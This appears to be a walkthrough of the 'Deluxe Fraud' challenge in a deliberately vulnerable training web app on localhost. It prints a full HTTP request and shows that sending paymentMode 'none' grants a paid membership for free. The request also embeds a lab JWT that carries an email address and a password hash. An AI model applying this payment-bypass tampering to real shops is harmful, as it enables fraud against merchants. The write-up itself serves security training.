# Deluxe Fraud

**Difficulty**: :star2:

**Description**: Obtain a Deluxe Membership without paying for it.

**Category**: Improper Input Validation

**Tags**:

**Solution**:

First I tried to force submit the deluxe membership form with empty parameters:

<details>
<summary>Example request</summary>

```
POST /rest/deluxe-membership HTTP/1.1
Accept: application/json, text/plain, */*
Accept-Encoding: gzip, deflate, br
Accept-Language: en,en-US;q=0.9
Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0aWVudmluaC5kdW9uZzRAZ21haWwuY29tIiwicGFzc3dvcmQiOiI4MjdjY2IwZWVhOGE3MDZjNGMzNGExNjg5MWY4NGU3YiIsInJvbGUiOiJjdXN0b21lciIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiL2Fzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjItMDctMjIgMDI6MTU6NDEuOTQ1ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjItMDctMjIgMDI6MTU6NDEuOTQ1ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTY1ODQ1NjE1NiwiZXhwIjoxNjU4NDc0MTU2fQ.lr4WFo4ALp7VB9ki6IUdwblj2WqGMDh5u-MJIEiE8GQ9re580qX0uK3W4Yvlzbto3mGuG9dWsysF4MgsLuBrMJMtffWyKPZyu4rI-BwG__rknicsX2ZvxTYTxMRvJG5UKvSnzvOcIbn0zKRymslfyoLevspYl4SQvVjoG84oD_8
Connection: keep-alive
Content-Length: 31
Content-Type: application/json
Cookie: language=en; cookieconsent_status=dismiss; welcomebanner_status=dismiss; continueCode=4lVv9QOZJeAVbtqsVU9HkTzfxijKtPESeJSPBU48FPPIm8s38AMoEqgzBbLr; token=eyJ0eXAiOiJKV1QiLCJhbGciOiJSUzI1NiJ9.eyJzdGF0dXMiOiJzdWNjZXNzIiwiZGF0YSI6eyJpZCI6MjEsInVzZXJuYW1lIjoiIiwiZW1haWwiOiJ0aWVudmluaC5kdW9uZzRAZ21haWwuY29tIiwicGFzc3dvcmQiOiI4MjdjY2IwZWVhOGE3MDZjNGMzNGExNjg5MWY4NGU3YiIsInJvbGUiOiJjdXN0b21lciIsImRlbHV4ZVRva2VuIjoiIiwibGFzdExvZ2luSXAiOiIwLjAuMC4wIiwicHJvZmlsZUltYWdlIjoiL2Fzc2V0cy9wdWJsaWMvaW1hZ2VzL3VwbG9hZHMvZGVmYXVsdC5zdmciLCJ0b3RwU2VjcmV0IjoiIiwiaXNBY3RpdmUiOnRydWUsImNyZWF0ZWRBdCI6IjIwMjItMDctMjIgMDI6MTU6NDEuOTQ1ICswMDowMCIsInVwZGF0ZWRBdCI6IjIwMjItMDctMjIgMDI6MTU6NDEuOTQ1ICswMDowMCIsImRlbGV0ZWRBdCI6bnVsbH0sImlhdCI6MTY1ODQ1NjE1NiwiZXhwIjoxNjU4NDc0MTU2fQ.lr4WFo4ALp7VB9ki6IUdwblj2WqGMDh5u-MJIEiE8GQ9re580qX0uK3W4Yvlzbto3mGuG9dWsysF4MgsLuBrMJMtffWyKPZyu4rI-BwG__rknicsX2ZvxTYTxMRvJG5UKvSnzvOcIbn0zKRymslfyoLevspYl4SQvVjoG84oD_8
DNT: 1
Host: localhost:3000
Origin: http://localhost:3000
Referer: http://localhost:3000/
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin
User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Safari/537.36
sec-ch-ua: ".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"
sec-ch-ua-mobile: ?0
sec-ch-ua-platform: "Linux"

{
    "paymentMode": "card"
}
```

</details>

But I got a bad request error:

![bad request](https://user-images.githubusercontent.com/64480713/180348736-c7908150-e91c-4edf-9618-bacb5c001069.png)

So I tried to submit with `paymentMode` is `none`, and it just works:

![result](https://user-images.githubusercontent.com/64480713/180349077-262bec29-8178-4137-811f-fbfc0617ae96.png)


